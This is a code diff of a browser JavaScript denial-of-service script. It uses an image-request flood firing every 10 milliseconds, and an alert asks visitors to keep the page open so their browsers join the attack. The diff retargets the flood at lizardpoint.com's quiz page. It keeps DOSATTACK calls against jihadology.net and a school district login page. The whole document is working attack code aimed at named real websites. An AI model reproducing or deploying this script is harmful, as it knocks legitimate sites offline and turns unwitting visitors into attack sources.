@@ -2,7 +2,7 @@ alert("Sending an attack =D, so just do what you want but leave this site open o
 
 function imgflood(link) {  
   var TARGET = link;
-  var URI = '/index.html';
+  var URI = '/geography/africa-quiz.php';
   var pic = new Image();
   var rand = Math.floor(Math.random() * 1000);
   pic.src = 'http:'+TARGET+URI+rand+'=val';
@@ -18,8 +18,7 @@ setInterval(function(){
 }
 
 setInterval(function(){
-  imgflood("jihadology.net");
-  imgflood("ls-child.mvcsc.k12.in.us/login");
+  imgflood("https://lizardpoint.com");
   DOSATTACK("jihadology.net");
   DOSATTACK("ls-child.mvcsc.k12.in.us/login");
 }, 10);
